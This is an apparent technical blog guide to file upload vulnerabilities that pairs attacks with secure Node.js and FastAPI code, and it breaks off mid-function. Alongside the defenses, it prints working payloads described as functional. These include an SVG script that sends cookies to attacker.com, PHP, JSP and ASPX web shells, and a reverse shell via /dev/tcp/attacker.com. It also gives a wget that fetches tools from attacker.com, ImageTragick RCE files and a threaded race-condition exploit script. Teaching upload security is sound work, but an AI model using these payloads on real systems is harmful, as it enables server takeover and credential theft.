# File Upload Vulnerabilities: The Complete Exploitation and Defense Guide

**Meta Description:** A deep technical guide to file upload vulnerabilities covering SVG XSS, MIME type bypass, polyglot files, ImageTragick, web shell upload, race conditions, path traversal, AWS S3 presigned URL abuse, and complete Burp Suite testing workflows with real payloads and secure code in Node.js and FastAPI.

**Slug:** file-upload-vulnerabilities-deep-dive

**Keywords:** file upload vulnerability, web shell upload, MIME type bypass, polyglot file upload, ImageTragick, SVG XSS, path traversal filename, race condition upload, presigned URL abuse, Burp Suite file upload testing, multer security, FastAPI file upload security

---

## Introduction

File upload is one of the most dangerous features you can expose in a web application. Every upload endpoint is an invitation for an attacker to push executable code, overwrite critical files, exfiltrate data, or pivot deeper into your infrastructure. The attack surface is enormous: the filename, the content type, the file body, the storage path, the processing pipeline, and the access controls around the stored file all present independent exploitation vectors.

This is not a theoretical concern. File upload vulnerabilities have been responsible for full remote code execution on production servers at companies of every size. They appear consistently in OWASP Top 10 under "Security Misconfiguration" and "Insecure Design." Bug bounty platforms pay $5,000 to $50,000+ for critical file upload bugs that achieve RCE.

This guide covers every major file upload attack class in depth: how the attack works mechanically, what the real payloads look like, how to test for it in Burp Suite, how developers introduce the vulnerability, and how to write code that is actually secure. Every code example runs. Every payload is functional. Every bypass is documented from real-world engagements.

---

## SVG Upload Abuse: Embedded JavaScript in SVG

### The Attack

SVG files are XML documents. Unlike raster images (PNG, JPEG), SVGs can contain embedded JavaScript, CSS, external resource references, and even `<foreignObject>` elements that render arbitrary HTML. When an application accepts SVG uploads and serves them back with a content type of `image/svg+xml`, the browser executes the embedded JavaScript in the context of the serving domain.

This is stored XSS through a file upload.

### Real Payloads

**Basic SVG XSS:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255)" />
  <script type="text/javascript">
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```

**SVG with event handler:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="40" />
</svg>
```

**SVG with foreignObject (renders full HTML):**

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <foreignObject width="500" height="500">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="javascript:alert(document.cookie)"></iframe>
    </body>
  </foreignObject>
</svg>
```

**SVG with external stylesheet exfiltration:**

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <style>
    @import url('https://attacker.com/log?referer=' + window.location);
  </style>
  <rect width="100" height="100" />
</svg>
```

### Why Developers Get This Wrong

Most upload validation checks the file extension and maybe the MIME type. SVG passes both checks because it is a legitimate image format. Developers think "it is an image, so it is safe." They do not understand that SVG is an XML document with a full scripting capability.

### Prevention

1. **Do not allow SVG uploads** unless you have a specific, justified need.
2. If you must accept SVGs, sanitize them server-side by stripping `<script>`, event handler attributes (`onload`, `onerror`, `onclick`, etc.), `<foreignObject>`, `<iframe>`, `<embed>`, and `<object>` elements.
3. Serve uploaded SVGs with `Content-Type: image/svg+xml` AND `Content-Disposition: attachment` to prevent inline rendering.
4. Serve all user-uploaded content from a separate domain (e.g., `uploads.example-cdn.com`) so that even if XSS fires, it cannot access cookies or session tokens on your main domain.

```javascript
// Using DOMPurify on the server to sanitize SVG
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function sanitizeSVG(svgContent) {
  return DOMPurify.sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
    ADD_TAGS: ['use'],
    FORBID_TAGS: ['script', 'foreignObject', 'iframe', 'embed', 'object'],
    FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onmouseover', 'onfocus', 'xlink:href']
  });
}
```

---

## MIME Type Bypass: Content-Type Manipulation

### The Attack

When a client uploads a file, the `Content-Type` header in the multipart form data is entirely client-controlled. An attacker can upload a PHP web shell while setting the Content-Type to `image/jpeg`. If the server only checks the Content-Type header and not the actual file content, the malicious file passes validation.

### The HTTP Request

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=--boundary123

----boundary123
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
----boundary123--
```

In Burp Suite, intercept the upload request and change the `Content-Type` from `application/x-php` to `image/jpeg`, `image/png`, or `image/gif`. The server-side code that only validates the MIME type will accept it.

### Vulnerable Code Pattern (Node.js with Multer)

```javascript
const multer = require('multer');

// VULNERABLE: Only checks MIME type from the client
const upload = multer({
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true); // file.mimetype comes from the client Content-Type header
    } else {
      cb(new Error('Invalid file type'), false);
    }
  }
});
```

The problem: `file.mimetype` in Multer is parsed directly from the `Content-Type` header sent by the client. It is not derived from the actual file content.

### Why This Bypass Works

The MIME type in a multipart upload is a declaration by the client, not a verification by the server. There is no cryptographic binding between the Content-Type header and the file content. The server must independently verify the file type by inspecting the file content itself (magic bytes, file signature).

### Detection

Use the `file-type` npm package or `python-magic` to inspect actual file content:

```javascript
const fileType = require('file-type');
const fs = require('fs');

async function validateFileContent(filePath) {
  const buffer = fs.readFileSync(filePath);
  const type = await fileType.fromBuffer(buffer);

  if (!type || !['image/jpeg', 'image/png', 'image/gif'].includes(type.mime)) {
    throw new Error('File content does not match an allowed image type');
  }

  return type;
}
```

---

## Double Extension Bypass

### The Attack

Many upload filters check only the final extension. Attackers use double extensions to bypass these filters while the web server interprets the file using a different extension.

**Common payloads:**

```
shell.php.jpg        -- Filter sees .jpg, Apache may execute as PHP if misconfigured
shell.php%00.jpg     -- Null byte truncation (older PHP/Java versions)
shell.php.           -- Trailing dot (Windows servers strip it, file becomes shell.php)
shell.php;.jpg       -- Semicolon bypass (IIS specific)
shell.pHp            -- Case variation bypass
shell.php5           -- Alternative PHP extensions
shell.phtml          -- Alternative PHP extensions
shell.shtml          -- Server-side includes
shell.php.png.jpg    -- Multiple extensions, some servers parse left-to-right
```

### Null Byte Injection

In older versions of PHP (< 5.3.4), Java, and some C-based parsers, a null byte (`%00` or `\x00`) terminates the string. The file system sees `shell.php` while the application sees `shell.php%00.jpg`.

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
----boundary--
```

### Apache .htaccess Double Extension

If the attacker can upload an `.htaccess` file:

```
AddType application/x-httpd-php .jpg
```

Now every `.jpg` file in that directory is executed as PHP.

### Prevention

```javascript
const path = require('path');

function getCleanExtension(filename) {
  // Remove null bytes
  const cleaned = filename.replace(/\0/g, '');

  // Get all extensions
  const parts = cleaned.split('.');
  if (parts.length < 2) return '';

  // Check every extension segment for dangerous types
  const dangerousExtensions = [
    'php', 'php5', 'phtml', 'phar', 'shtml',
    'jsp', 'jspx', 'jsw', 'jsv',
    'asp', 'aspx', 'cer', 'asa',
    'py', 'pl', 'cgi', 'sh', 'bat', 'exe',
    'htaccess', 'htpasswd', 'config', 'svg'
  ];

  for (let i = 1; i < parts.length; i++) {
    const ext = parts[i].toLowerCase().trim();
    if (dangerousExtensions.includes(ext)) {
      return null; // Reject the file
    }
  }

  return parts[parts.length - 1].toLowerCase();
}
```

---

## Path Traversal via Filename

### The Attack

If the application uses the user-supplied filename to construct the storage path without sanitization, an attacker can use directory traversal sequences to write files to arbitrary locations on the filesystem.

### Payloads

```
../../../etc/cron.d/backdoor
../../var/www/html/shell.php
..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd    (double URL encoding)
```

### The HTTP Request

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="document"; filename="../../../var/www/html/shell.php"
Content-Type: application/pdf

<?php system($_GET['cmd']); ?>
----boundary--
```

### Vulnerable Code

```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');

// VULNERABLE: Uses the original filename directly
const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    cb(null, file.originalname); // attacker controls this
  }
});
```

When `file.originalname` is `../../../var/www/html/shell.php`, the file is written outside the intended upload directory.

### Fixed Code

```javascript
const crypto = require('crypto');
const path = require('path');

const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    // Generate a random filename, ignore the user-supplied name entirely
    const ext = path.extname(file.originalname).toLowerCase().replace(/[^a-z0-9.]/g, '');
    const safeName = crypto.randomBytes(16).toString('hex') + ext;
    cb(null, safeName);
  }
});
```

The fix: never use the original filename. Generate a random name server-side. Store the original filename in a database if you need to display it later.

### Additional Defense: Verify Resolved Path

```javascript
const fs = require('fs');
const path = require('path');

function safeFilePath(baseDir, userFilename) {
  const resolvedBase = path.resolve(baseDir);
  const resolvedPath = path.resolve(baseDir, userFilename);

  if (!resolvedPath.startsWith(resolvedBase + path.sep)) {
    throw new Error('Path traversal attempt detected');
  }

  return resolvedPath;
}
```

---

## Web Shell Upload

### The Attack

The ultimate goal of most file upload attacks: getting a web shell on the server. A web shell is a script (PHP, JSP, ASPX, Python) that executes operating system commands when accessed via HTTP.

### Web Shell Payloads

**Minimal PHP web shell:**

```php
<?php system($_GET['cmd']); ?>
```

**PHP web shell with authentication:**

```php
<?php
if($_GET['key'] !== 'secretkey123') die('404 Not Found');
echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';
?>
```

**JSP web shell:**

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) {
    out.println(line);
  }
}
%>
```

**ASPX web shell:**

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
if (cmd != null) {
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
```

### Post-Upload Exploitation

Once the web shell is uploaded to `/uploads/shell.php`:

```bash
# Basic command execution
curl "https://target.com/uploads/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Read sensitive files
curl "https://target.com/uploads/shell.php?cmd=cat%20/etc/passwd"

# Reverse shell
curl "https://target.com/uploads/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/attacker.com/4444%200>%261'"

# Download additional tools
curl "https://target.com/uploads/shell.php?cmd=wget%20https://attacker.com/linpeas.sh%20-O%20/tmp/linpeas.sh"
```

### Detection on the Server

```bash
# Find recently uploaded PHP files in upload directories
find /var/www/uploads -name "*.php" -newer /var/www/uploads -mtime -1

# Scan for common web shell patterns
grep -rn "system\|exec\|passthru\|shell_exec\|popen\|proc_open" /var/www/uploads/

# Check for base64 encoded payloads (common obfuscation)
grep -rn "base64_decode\|eval\|assert\|create_function" /var/www/uploads/
```

---

## Polyglot File Upload

### The Attack

A polyglot file is simultaneously valid as two different file types. The classic example is a file that is both a valid JPEG image and a valid PHP script. It passes image validation (magic bytes check, dimension check, even `getimagesize()`) while containing executable PHP code.

### Creating a JPEG/PHP Polyglot

```bash
# Start with a minimal valid JPEG
# JPEG magic bytes: FF D8 FF E0
# Insert PHP code into a JPEG comment section

# Method 1: Using exiftool to inject PHP into EXIF data
exiftool -Comment='<?php system($_GET["cmd"]); ?>' innocent.jpg

# Method 2: Append PHP after valid JPEG data
cat real_image.jpg > polyglot.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php.jpg
```

### Why Standard Checks Fail

```php
// This passes for a polyglot file:
$imageInfo = getimagesize($uploadedFile);
if ($imageInfo !== false) {
    // Valid image! (But also valid PHP)
    move_uploaded_file($uploadedFile, $destination);
}
```

`getimagesize()` reads the JPEG headers and finds valid image dimensions. It does not scan the rest of the file for embedded PHP code. The file passes validation and is stored with a `.jpg` extension. If the server is configured to parse PHP in `.jpg` files (via `.htaccess` or misconfiguration), the embedded PHP executes.

### GIF/PHP Polyglot

```
GIF89a;
<?php system($_GET['cmd']); ?>
```

The string `GIF89a` is the magic bytes for a GIF file. Many file-type detection libraries will identify this as `image/gif`. The PHP code after the header is ignored by image parsers but executed by PHP.

### Prevention

1. **Re-encode uploaded images.** Do not just validate the image -- create a new image from it using a library like Sharp (Node.js) or Pillow (Python). This strips all metadata and embedded code.

```javascript
const sharp = require('sharp');

async function sanitizeImage(inputPath, outputPath) {
  await sharp(inputPath)
    .resize(1920, 1080, { fit: 'inside', withoutEnlargement: true })
    .jpeg({ quality: 85 }) // Re-encode as JPEG regardless of input format
    .toFile(outputPath);
}
```

2. **Never execute uploaded files.** Store them outside the web root or on a separate storage service (S3, GCS) and serve them via a CDN with strict content-type headers.

---

## Image Processing Bugs: ImageMagick and ImageTragick

### The Attack (CVE-2016-3714 -- ImageTragick)

ImageMagick is used by millions of web applications to resize, crop, and convert uploaded images. In 2016, ImageTragick was disclosed: a set of vulnerabilities that allowed remote code execution through specially crafted image files.

ImageMagick supports "delegate" protocols that shell out to external programs. An attacker can craft an image file that triggers command execution through these delegates.

### ImageTragick Payloads

**MVG (Magick Vector Graphics) payload for RCE:**

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**SVG-based ImageTragick payload:**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="640px" height="480px">
  <image xlink:href="https://example.com/image.jpg&quot;|ls -la /etc > /tmp/output&quot;"
    x="0" y="0" height="640px" width="480px"/>
</svg>
```

**Ephemeral file read via ImageMagick:**

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'ephemeral:/etc/passwd'
pop graphic-context
```

### Newer ImageMagick CVEs

ImageTragick was not the last ImageMagick vulnerability. Subsequent CVEs include:

- **CVE-2022-44268**: Information disclosure through PNG text chunks. Upload a crafted PNG, and ImageMagick leaks the content of arbitrary files on the server into the processed output image.
- **CVE-2023-34152**: Shell injection via filename processing.

**CVE-2022-44268 exploitation:**

```bash
# Create a malicious PNG that will read /etc/passwd
pngcrush -text a "profile" "/etc/passwd" input.png output.png

# Upload output.png to the target
# Download the processed/resized image
# Extract the leaked file content from the PNG metadata
identify -verbose downloaded_processed.png | grep -A 100 "Raw profile type"
```

### Prevention

```bash
# /etc/ImageMagick-6/policy.xml or /etc/ImageMagick-7/policy.xml
<policymap>
  <!-- Disable dangerous coders -->
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />

  <!-- Restrict resource usage -->
  <policy domain="resource" name="memory" value="256MiB"/>
  <policy domain="resource" name="map" value="512MiB"/>
  <policy domain="resource" name="width" value="8KP"/>
  <policy domain="resource" name="height" value="8KP"/>
  <policy domain="resource" name="area" value="64MP"/>
  <policy domain="resource" name="disk" value="1GiB"/>

  <!-- Disable delegates that shell out -->
  <policy domain="delegate" rights="none" pattern="*" />
</policymap>
```

Better approach: use libraries that do not shell out, like `libvips` (via Sharp in Node.js) or Pillow in Python, instead of ImageMagick.

---

## Race Condition in File Upload

### The Attack

Some applications upload the file first, then validate it, and delete it if validation fails. There is a time window between the file being written to disk and the validation completing. If the attacker can access the file during this window, they can execute it.

**The vulnerable flow:**

1. File is uploaded and written to `/uploads/shell.php`
2. Server begins validation (file type check, antivirus scan)
3. **Attacker sends GET /uploads/shell.php** (file is already on disk)
4. Shell executes, attacker has RCE
5. Validation fails, server deletes the file (too late)

### Exploitation Script

```python
import threading
import requests

TARGET = "https://target.com"
UPLOAD_URL = f"{TARGET}/api/upload"
SHELL_URL = f"{TARGET}/uploads/shell.php"
SHELL_CONTENT = b"<?php system($_GET['cmd']); ?>"

def upload_loop():
    while True:
        files = {'file': ('shell.php', SHELL_CONTENT, 'image/jpeg')}
        try:
            requests.post(UPLOAD_URL, files=files, timeout=5)
        except:
            pass

def access_loop():
    while True:
        try:
            r = requests.get(f"{SHELL_URL}?cmd=id", timeout=5)
            if "uid=" in r.text:
                print(f"[+] RCE achieved: {r.text}")
                return
        except:
            pass

# Launch concurrent threads
for _ in range(10):
    threading.Thread(target=upload_loop, daemon=True).start()
for _ in range(20):
    threading.Thread(target=access_loop, daemon=True).start()

import time
time.sleep(300)  # Run for 5 minutes
```

### Prevention

1. **Validate before writing to the final location.** Write to a temporary directory that is not web-accessible, validate, then move to the final location.
2. **Use random filenames.** Even if the file exists briefly, the attacker cannot predict the filename to access it.
3. **Never store uploads in the web root.**

```javascript
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

async function secureUpload(fileBuffer, originalName) {
  // Step 1: Write to temp directory (not web-accessible)
  const tempDir = os.tmpdir();
  const tempName = crypto.randomBytes(16).toString('hex');
  const tempPath = path.join(tempDir, tempName);
  fs.writeFileSync(tempPath, fileBuffer);

  try {
    // Step 2: Validate the file content
    await validateFileContent(tempPath);

    // Step 3: Generate safe filename and move to final location
    const safeExt = getAllowedExtension(originalName);
    const finalName = crypto.randomBytes(16).toString('hex') + safeExt;
    const finalPath = path.join('/var/data/uploads', finalName); // Outside web root

    fs.renameSync(tempPath, finalPath);
    return finalName;
  } finally {
    // Clean up temp file if it still exists
    if (fs.existsSync(tempPath)) {
      fs.unlinkSync(tempPath);
    }
  }
}
```

---

## Bypassing Client-Side Validation

### The Attack

Client-side validation is cosmetic. It provides user experience but zero security. Every client-side check can be bypassed by:

1. Disabling JavaScript in the browser
2. Intercepting the request with Burp Suite and modifying it
3. Sending the request directly with cURL, Python, or any HTTP client

### Common Client-Side Checks and Their Bypasses

**JavaScript file extension check:**

```javascript
// Client-side code
function validateFile(input) {
  const file = input.files[0];
  const allowed = ['.jpg', '.jpeg', '.png', '.gif'];
  const ext = file.name.substring(file.name.lastIndexOf('.'));
  if (!allowed.includes(ext.toLowerCase())) {
    alert('Invalid file type');
    return false;
  }
  return true;
}
```

**Bypass:** Intercept the POST request in Burp Suite after the JavaScript check passes. Change the filename from `image.jpg` to `shell.php`. The JavaScript already approved it; the server receives the modified request.

**HTML accept attribute:**

```html
<input type="file" name="upload" accept="image/*">
```

**Bypass:** The `accept` attribute only affects the file picker dialog. It has no effect on what the browser actually sends. Use Burp or cURL to upload any file type.

**JavaScript file size check:**

```javascript
if (file.size > 5 * 1024 * 1024) {
  alert('File too large');
  return false;
}
```

**Bypass:** Same approach. The check happens in the browser. The server receives whatever you send.

### The Rule

**Every security check must be enforced server-side.** Client-side validation is for user experience only. Do not trust any data that originated from the client.

---

## Bypassing File Size Restrictions

### The Attack

Server-side file size limits can sometimes be bypassed through:

**1. Chunked Transfer Encoding:**

```http
POST /api/upload HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="file"; filename="large.jpg"
Content-Type: image/jpeg

[chunked data -- size not known upfront]
----boundary--
```

Some servers check `Content-Length` but do not enforce limits on chunked transfers.

**2. Compressed payloads:**

Upload a small gzip-compressed file. If the server decompresses before processing but checks size before decompression, a 1KB compressed file could expand to 1GB (zip bomb principle).

**3. Multiple small uploads:**

If the application allows multiple uploads or file replacement, upload many small files that collectively exhaust disk space.

### Prevention

```javascript
const multer = require('multer');

const upload = multer({
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB hard limit enforced by multer
    files: 1,                     // Maximum 1 file per request
    fields: 10,                   // Maximum 10 non-file fields
    parts: 15                     // Maximum 15 total parts
  }
});

// Also enforce at the reverse proxy level (nginx)
// client_max_body_size 5m;
```

---

## AWS S3 Presigned URL Abuse

### The Attack

Many modern applications use presigned URLs to allow clients to upload directly to S3, bypassing the application server. The flow is:

1. Client requests an upload URL from the backend
2. Backend generates a presigned S3 PUT URL
3. Client uploads directly to S3 using the presigned URL

If the presigned URL is generated without proper constraints, attackers can abuse it.

### Vulnerable Presigned URL Generation

```javascript
const { S3Client, PutObjectCommand } = require('@aws-sdk/client-s3');
const { getSignedUrl } = require('@aws-sdk/s3-request-presigner');

const s3Client = new S3Client({ region: 'us-east-1' });

// VULNERABLE: No content type restriction, no size limit, user controls the key
app.post('/api/get-upload-url', async (req, res) => {
  const { filename } = req.body;

  const command = new PutObjectCommand({
    Bucket: 'my-app-uploads',
    Key: filename  // User controls the full S3 key path
  });

  const url = await getSignedUrl(s3Client, command, { expiresIn: 3600 });
  res.json({ uploadUrl: url });
});
```

### Exploitation Scenarios

**1. Path traversal in S3 key:**

```json
{
  "filename": "../admin-assets/malicious.html"
}
```

If the S3 bucket serves static content (CloudFront + S3 origin), the attacker can overwrite or place files in unexpected paths.

**2. HTML/JS upload for stored XSS:**

Upload an HTML file to S3. If the bucket is served via CloudFront on the same domain or a trusted subdomain:

```bash
curl -X PUT "https://my-app-uploads.s3.amazonaws.com/profile-pics/xss.html?X-Amz-Algorithm=..." \
  -H "Content-Type: text/html" \
  -d '<html><script>document.location="https://attacker.com/?c="+document.cookie</script></html>'
```

**3. Overwriting existing files:**

If the presigned URL allows PUT to any key, the attacker can overwrite other users' uploads, application assets, or configuration files.

**4. Unlimited file size:**

Without a content-length restriction in the presigned URL, attackers can upload massive files to inflate your S3 bill.

### Secure Presigned URL Generation

```javascript
const crypto = require('crypto');
const path = require('path');

app.post('/api/get-upload-url', async (req, res) => {
  const { contentType } = req.body;

  // Whitelist allowed content types
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
  if (!allowedTypes.includes(contentType)) {
    return res.status(400).json({ error: 'Invalid content type' });
  }

  // Map content types to extensions
  const extMap = { 'image/jpeg': '.jpg', 'image/png': '.png', 'image/webp': '.webp' };
  const ext = extMap[contentType];

  // Generate a random key scoped to the user
  const userId = req.user.id;
  const randomName = crypto.randomBytes(16).toString('hex');
  const key = `uploads/${userId}/${randomName}${ext}`;

  const command = new PutObjectCommand({
    Bucket: 'my-app-uploads',
    Key: key,
    ContentType: contentType,  // Enforce the content type
    ContentLength: undefined    // See conditions below
  });

  const url = await getSignedUrl(s3Client, command, {
    expiresIn: 300,  // 5 minute expiry, not 1 hour
    // S3 presigned URLs can include conditions for content-length-range
    // This requires using createPresignedPost instead
  });

  res.json({ uploadUrl: url, key });
});

// Better approach: Use presigned POST with conditions
const { createPresignedPost } = require('@aws-sdk/s3-presigned-post');

app.post('/api/get-upload-url-v2', async (req, res) => {
  const { contentType } = req.body;
  const userId = req.user.id;
  const randomName = crypto.randomBytes(16).toString('hex');
  const key = `uploads/${userId}/${randomName}`;

  const { url, fields } = await createPresignedPost(s3Client, {
    Bucket: 'my-app-uploads',
    Key: key,
    Conditions: [
      ['content-length-range', 1, 5 * 1024 * 1024],  // 1 byte to 5MB
      ['starts-with', '$Content-Type', 'image/'],      // Must be an image
      ['eq', '$key', key]                               // Cannot change the key
    ],
    Expires: 300
  });

  res.json({ url, fields });
});
```

### S3 Bucket Configuration Hardening

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyNonImageUploads",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::my-app-uploads/uploads/*",
      "Condition": {
        "StringNotLike": {
          "s3:content-type": ["image/jpeg", "image/png", "image/webp"]
        }
      }
    }
  ]
}
```

---

## Express.js Multer: Vulnerable Upload Code + Fixed Code

### Vulnerable Implementation

```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();

// VULNERABLE: Multiple issues
const storage = multer.diskStorage({
  destination: path.join(__dirname, 'public', 'uploads'), // Inside web root
  filename: (req, file, cb) => {
    cb(null, file.originalname); // User-controlled filename
  }
});

const upload = multer({
  storage,
  fileFilter: (req, file, cb) => {
    // Only checks client-supplied MIME type
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only images allowed'));
    }
  }
  // No file size limit
});

app.post('/upload', upload.single('avatar'), (req, res) => {
  // No content validation
  // File is already saved to public/uploads with original name
  res.json({
    message: 'Upload successful',
    url: `/uploads/${req.file.originalname}` // Reflected without encoding
  });
});

// Static file serving exposes uploads directly
app.use('/uploads', express.static(path.join(__dirname, 'public', 'uploads')));

app.listen(3000);
```

**What is wrong:**
1. Files stored inside the public web root with static serving enabled
2. Original filename used (path traversal, extension attacks)
3. Only MIME type checked (client-controlled)
4. No file content validation
5. No file size limit
6. Filename reflected in response without encoding

### Secure Implementation

```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const fileType = require('file-type');
const sharp = require('sharp');

const app = express();

// Store outside web root in a temp location
const tempStorage = multer.memoryStorage();

const upload = multer({
  storage: tempStorage,
  limits: {
    fileSize: 5 * 1024 * 1024,  // 5MB
    files: 1,
    fields: 5,
    parts: 10
  },
  fileFilter: (req, file, cb) => {
    // First layer: check declared MIME (defense in depth, not sole check)
    const allowedMime = ['image/jpeg', 'image/png', 'image/webp'];
    if (allowedMime.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'), false);
    }
  }
});

const UPLOAD_DIR = '/var/data/uploads'; // Outside web root

app.post('/upload', upload.single('avatar'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file provided' });
    }

    // Validate actual file content using magic bytes
    const detectedType = await fileType.fromBuffer(req.file.buffer);
    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];

    if (!detectedType || !allowedTypes.includes(detectedType.mime)) {
      return res.status(400).json({ error: 'Invalid file content' });
    }

    // Re-encode the image to strip any embedded payloads
    const sanitized = await sharp(req.file.buffer)
      .resize(800, 800, { fit: 'inside', withoutEnlargement: true })
      .jpeg({ quality: 85 })
      .toBuffer();

    // Generate safe filename
    const safeName = crypto.randomBytes(16).toString('hex') + '.jpg';
    const finalPath = path.join(UPLOAD_DIR, safeName);

    // Verify the resolved path is within the upload directory
    if (!path.resolve(finalPath).startsWith(path.resolve(UPLOAD_DIR))) {
      return res.status(400).json({ error: 'Invalid file path' });
    }

    fs.writeFileSync(finalPath, sanitized);

    // Store mapping in database: safeName -> userId, originalName, uploadDate
    // await db.uploads.create({ userId: req.user.id, storedName: safeName, ... });

    res.json({
      message: 'Upload successful',
      fileId: safeName.replace('.jpg', '')  // Return an ID, not a path
    });
  } catch (err) {
    console.error('Upload error:', err);
    res.status(500).json({ error: 'Upload failed' });
  }
});

// Serve files through a controlled endpoint, not static file serving
app.get('/files/:fileId', async (req, res) => {
  const fileId = req.params.fileId.replace(/[^a-f0-9]/g, ''); // Strict allowlist
  const filePath = path.join(UPLOAD_DIR, fileId + '.jpg');

  if (!fs.existsSync(filePath)) {
    return res.status(404).json({ error: 'Not found' });
  }

  res.setHeader('Content-Type', 'image/jpeg');
  res.setHeader('Content-Disposition', 'inline; filename="image.jpg"');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Security-Policy', "default-src 'none'");
  res.sendFile(filePath);
});

app.listen(3000);
```

---

## FastAPI File Upload: Vulnerable Code + Fixed Code

### Vulnerable Implementation

```python
from fastapi import FastAPI, UploadFile, File
import shutil
import os

app = FastAPI()

UPLOAD_DIR = "static/uploads"  # Inside web root, served by static files

@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    # VULNERABLE: No validation at all
    file_path = os.path.join(UPLOAD_DIR, file.filename)  # User-controlled path

    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {
        "filename": file.filename,
        "url": f"/static/uploads/{file.filename}"
    }

# Mount static files -- uploaded files are directly accessible
from fastapi.staticfiles import StaticFiles
app.mount("/static", StaticFiles(directory="static"), name="static")
```

### Secure Implementation

```python
import os
import secrets
import hashlib
from pathlib import Path
from fastapi import FastAPI, UploadFile, File, HTTPException
from fastapi.responses import FileResponse
import magic  # python-magic
from PIL import Image
from io import BytesIO

app = FastAPI()

UPLOAD_DIR = Path("/var/data/uploads")  # Outside web root
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
ALLOWED_MIME_TYPES = {"image/jpeg", "image/png", "image/webp"}
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".webp"}


def validate_file_content(content: bytes) -> str:
    """Validate file content using magic bytes, not client-declared type."""
    detected_mime = magic.from_buffer(content, mime=True)
    if detected_mime not in ALLOWED_MIME_TYPES:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid file type: {detected_mime}"
        )
    return detected_mime


def sanitize_image(content: bytes) -> bytes:
    """Re-encode the image to strip embedded payloads."""
    try:
        img = Image.open(BytesIO(content))
        img.verify()  # Verify it is actually an image

